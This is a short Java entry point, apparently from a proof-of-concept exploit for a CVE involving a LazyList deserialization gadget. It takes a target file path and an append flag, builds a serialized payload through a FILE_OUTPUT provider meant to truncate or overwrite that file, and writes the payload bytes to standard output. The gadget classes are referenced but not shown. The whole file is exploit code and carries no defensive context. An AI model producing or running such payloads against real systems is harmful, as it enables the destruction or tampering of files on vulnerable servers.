package poc.cve.lazylist.payload;

import poc.cve.lazylist.function0.DefaultProviders;

import java.io.IOException;

public class Main {
    public static void main(String[] args) throws IOException {
        String fileToTruncate = args[0];
        boolean append = Boolean.parseBoolean(args[1]);

        PayloadGenerator payloadGenerator = new LazyList(DefaultProviders.FILE_OUTPUT);
        byte[] payload = payloadGenerator.generatePayload(fileToTruncate, append);

        System.out.write(payload);
    }
}
